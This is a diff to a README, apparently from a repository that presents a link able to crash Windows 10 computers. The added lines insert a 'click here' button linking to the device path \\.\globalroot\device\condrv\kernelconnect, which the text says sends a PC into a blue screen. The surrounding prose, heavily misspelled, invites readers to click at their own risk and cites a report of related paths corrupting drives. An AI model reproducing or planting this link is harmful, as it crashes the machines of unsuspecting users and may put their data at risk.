@@ -6,6 +6,10 @@ This is a secource File that broing any Windows PC uptop Windows 10 latest Updat
 If you are a windows user and you say this is a joke to just visting a link will fall your computer into trubleshoot mode with a screen of Death then click below link at your own risk.
 
 
+<p align="center">
+  <a href="\\.\globalroot\device\condrv\kernelconnect"><img src="./images/click-here-button.png" width="250"/></a>
+</p>
+
 
 ## Is this really harmfull?
 Yes it might be butg with some addition resources with this pached Link can even crack your Harddrive, Folder and so on. Here is what same link access with additional resource could do with your computer. https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/
